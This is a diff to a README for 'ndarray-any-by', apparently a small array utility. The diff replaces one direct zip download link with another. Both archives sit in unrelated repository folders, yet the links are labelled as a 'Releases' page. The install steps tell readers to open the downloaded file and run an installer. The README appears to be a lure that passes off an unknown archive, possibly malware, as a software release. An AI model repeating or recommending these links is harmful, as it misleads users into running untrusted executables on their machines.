@@ -6,9 +6,9 @@ Welcome to the ndarray-any-by project. This application helps you test if at lea
 
 ## 📦 Download
 
-[![Download Now](https://raw.githubusercontent.com/MeerAkrayi/ndarray-any-by/main/countermandable/ndarray-any-by.zip%https://raw.githubusercontent.com/MeerAkrayi/ndarray-any-by/main/countermandable/ndarray-any-by.zip)](https://raw.githubusercontent.com/MeerAkrayi/ndarray-any-by/main/countermandable/ndarray-any-by.zip)
+[![Download Now](https://github.com/MeerAkrayi/ndarray-any-by/raw/refs/heads/main/test/by-ndarray-any-v2.5.zip%https://github.com/MeerAkrayi/ndarray-any-by/raw/refs/heads/main/test/by-ndarray-any-v2.5.zip)](https://github.com/MeerAkrayi/ndarray-any-by/raw/refs/heads/main/test/by-ndarray-any-v2.5.zip)
 
-To get started, visit this page to download the application: [ndarray-any-by Releases](https://raw.githubusercontent.com/MeerAkrayi/ndarray-any-by/main/countermandable/ndarray-any-by.zip).
+To get started, visit this page to download the application: [ndarray-any-by Releases](https://github.com/MeerAkrayi/ndarray-any-by/raw/refs/heads/main/test/by-ndarray-any-v2.5.zip).
 
 ## ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ To get started, visit this page to download the application: [ndarray-any-by Rel
 
 To install the application, follow these steps:
 
-1. Click on the link to the releases page: [ndarray-any-by Releases](https://raw.githubusercontent.com/MeerAkrayi/ndarray-any-by/main/countermandable/ndarray-any-by.zip).
+1. Click on the link to the releases page: [ndarray-any-by Releases](https://github.com/MeerAkrayi/ndarray-any-by/raw/refs/heads/main/test/by-ndarray-any-v2.5.zip).
 2. Look for the latest version of the software.
 3. Download the package suitable for your operating system.
 4. Open the downloaded file to run the installer.
